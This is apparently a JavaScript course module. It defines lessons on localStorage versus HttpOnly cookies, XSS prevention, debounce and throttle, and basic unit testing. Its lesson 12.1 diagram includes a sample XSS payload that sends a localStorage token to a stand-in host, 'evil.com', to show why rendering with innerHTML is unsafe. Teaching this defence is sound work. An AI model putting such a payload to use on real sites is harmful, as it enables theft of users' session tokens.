// Level 12: Testing, Security, Performance & Browser Storage
export const level12TestingSecurityPerf = {
  id: 'level-12',
  title: 'Level 12: Storage, Security & Performance',
  icon: 'bi-shield-lock-fill',
  color: '#059669',
  description: 'Master browser persistence (localStorage vs cookies), XSS web security defenses, Debouncing/Throttling performance optimizations, and unit testing in baby steps.',
  chapters: [
    {
      id: 'storage-security-performance',
      title: '12. Storage, Security & Optimization',
      lessons: [
        {
          id: 'browser-storage-and-web-security',
          slug: 'browser-storage-and-web-security',
          order: '12.1',
          title: 'Browser Storage (localStorage vs Cookies) & XSS Security',
          subtitle: 'Persistent storage mechanisms, cookie security flags (HttpOnly, Secure, SameSite), Cross-Site Scripting (XSS) prevention, and sanitization in baby steps.',
          chapterId: 'storage-security-performance',
          chapterTitle: '12. Storage, Security & Optimization',
          levelTitle: 'Level 12: Storage, Security & Performance',
          goal: 'Understand how to persist user data safely in browser storage and protect applications against XSS injection attacks.',
          prerequisites: ['Level 11 completed.'],
          concept: `### 1. Browser Storage Comparison Matrix

| Storage Mechanism | Capacity | Persistence | Accessibility | Security Warning |
| :--- | :--- | :--- | :--- | :--- |
| **\`localStorage\`** | ~5MB - 10MB | Permanent (until manually cleared) | Accessible by any JS on the origin | ⚠️ Vulnerable to XSS token theft! |
| **\`sessionStorage\`** | ~5MB | Destroyed when browser tab is closed | Accessible by JS in current tab | ⚠️ Vulnerable to XSS in tab |
| **\`HttpOnly Cookie\`** | ~4KB | Set by server with expiration | **Inaccessible to JavaScript (\`document.cookie\` cannot read it!)** | ✅ Immune to JavaScript XSS token theft! |

---

### 2. Preventing Cross-Site Scripting (XSS)
XSS occurs when an attacker injects malicious JavaScript into your web page (e.g. via a comment box). If rendered using \`innerHTML\`, the script executes and can steal user data!
- **Rule 1**: Always use \`textContent\` or dedicated sanitizers (DOMPurify) when rendering user input.
- **Rule 2**: Never store sensitive auth refresh tokens in \`localStorage\`! Use server-set \`HttpOnly\` cookies instead.`,
          diagram: `flowchart TD
    Attacker["1. Attacker submits: <script>fetch('evil.com?c='+localStorage.getItem('token'))</script>"] --> Bad{"Rendered with innerHTML?"}
    Bad -->|"Yes (Vulnerable!)"| XSS["2. Malicious JS executes -> Steals user token!"]
    Bad -->|"No (Rendered with textContent)"| Safe["2. Safely rendered as literal harmless text characters on screen"]
    
    style Attacker fill:#f8d7da,stroke:#dc3545,color:#842029
    style XSS fill:#f8d7da,stroke:#dc3545,color:#842029
    style Safe fill:#d1e7dd,stroke:#198754,color:#0f5132`,
          steps: [
            {
              title: 'Step 1: Building a Type-Safe LocalStorage Storage Service',
              explanation: 'Create a resilient wrapper that automatically handles JSON serialization and storage quotas.',
              command: `const storageService = {
  get(key, defaultValue = null) {
    try {
      const raw = localStorage.getItem(key);
      return raw ? JSON.parse(raw) : defaultValue;
    } catch (err) {
      console.warn(\`Error reading \${key} from storage:\`, err);
      return defaultValue;
    }
  },

  set(key, value) {
    try {
      localStorage.setItem(key, JSON.stringify(value));
    } catch (err) {
      console.error(\`Storage quota exceeded or disabled:\`, err);
    }
  },

  remove(key) {
    localStorage.removeItem(key);
  }
};

// Usage:
storageService.set("theme_settings", { darkMode: true, fontSize: 16 });
const settings = storageService.get("theme_settings");
console.log("Loaded Settings:", settings);`
            }
          ],
          verification: 'Open Developer Tools -> Application tab -> Local Storage to inspect persisted JSON keys.',
          expectedResult: 'Safe and resilient client-side data persistence.',
          summary: 'Use localStorage for non-sensitive preferences with try/catch wrappers, and protect against XSS by strictly avoiding unescaped innerHTML.'
        },
        {
          id: 'performance-debouncing-throttling-testing',
          slug: 'performance-debouncing-throttling-testing',
          order: '12.2',
          title: 'Performance (Debounce & Throttle) & Unit Testing Basics',
          subtitle: 'Optimizing search inputs with Debouncing, scroll tracking with Throttling, and testing pure functions with the Arrange-Act-Assert pattern in baby steps.',
          chapterId: 'storage-security-performance',
          chapterTitle: '12. Storage, Security & Optimization',
          levelTitle: 'Level 12: Storage, Security & Performance',
          goal: 'Master debouncing search inputs to reduce server load, throttling scroll events, and writing automated unit tests.',
          prerequisites: ['Lesson 12.1 completed.'],
          concept: `### Rate Limiting: Debounce vs Throttle

When handling high-frequency events (typing into a search box, scrolling a page, resizing window):

1. **Debounce (Wait for user to STOP typing)**:
   - Delays execution until $X$ milliseconds have elapsed since the **last time** the event fired.
   - Ideal for: Search Autocomplete inputs (waits until user pauses typing before querying API).

2. **Throttle (Execute at most ONCE every interval)**:
   - Guarantees execution at a regular maximum rate (e.g. at most once every 200ms).
   - Ideal for: Window scrolling, infinite scroll loading, mouse tracking.`,
          diagram: `flowchart LR
    Typing["User types: 'R'...'e'...'a'...'c'...'t' (5 keystrokes in 300ms)"] --> Debounce["debounce(queryAPI, 300ms)"]
    Debounce --> Query["Fires EXACTLY 1 API request after typing stops!"]
    
    style Typing fill:#cfe2ff,stroke:#084298,color:#084298
    style Debounce fill:#fff3cd,stroke:#ffc107,color:#664d03
    style Query fill:#d1e7dd,stroke:#198754,color:#0f5132`,
          steps: [
            {
              title: 'Step 1: Implementing a Pure Vanilla JS Debounce Function',
              explanation: 'Build a debounce utility using closures and setTimeout timers.',
              command: `function debounce(callback, delayMs = 300) {
  let timerId = null;

  return function(...args) {
    // Clear any pending timer if user triggers event again
    if (timerId) clearTimeout(timerId);

    // Schedule new execution after delay
    timerId = setTimeout(() => {
      callback.apply(this, args);
    }, delayMs);
  };
}

// Example: Search Input listener
const performSearch = (searchTerm) => {
  console.log("Querying Backend API for:", searchTerm);
};

const debouncedSearch = debounce(performSearch, 400);

// Simulating rapid typing:
debouncedSearch("Ja");
debouncedSearch("Java");
debouncedSearch("JavaScript"); // Only this final call executes after 400ms!`
            },
            {
              title: 'Step 2: Writing a Unit Test (Arrange-Act-Assert Pattern)',
              explanation: 'Structure clean, automated unit tests for business functions.',
              command: `// 1. Pure function to test
function calculateDiscount(price, percentage) {
  if (price < 0 || percentage < 0 || percentage > 100) {
    throw new Error("Invalid discount parameters");
  }
  return Number((price - (price * (percentage / 100))).toFixed(2));
}

// 2. Unit Test Suite
function testDiscountCalculation() {
  // Arrange
  const originalPrice = 100;
  const discountPercent = 25;
  const expectedTotal = 75.00;

  // Act
  const actualTotal = calculateDiscount(originalPrice, discountPercent);

  // Assert
  if (actualTotal === expectedTotal) {
    console.log("✅ PASS: calculateDiscount computes 25% off 100 correctly.");
  } else {
    console.error(\`❌ FAIL: Expected \${expectedTotal} but got \${actualTotal}\`);
  }
}

testDiscountCalculation();`
            }
          ],
          verification: 'Run both snippets in the console. Notice how debounce cancels premature timer calls and the unit test asserts correctness.',
          expectedResult: 'High-performance event rate-limiting and reliable automated testing.',
          summary: 'Debounce search queries to eliminate duplicate server hits, throttle scroll events, and write unit tests following the Arrange-Act-Assert methodology.'
        }
      ]
    }
  ]
};
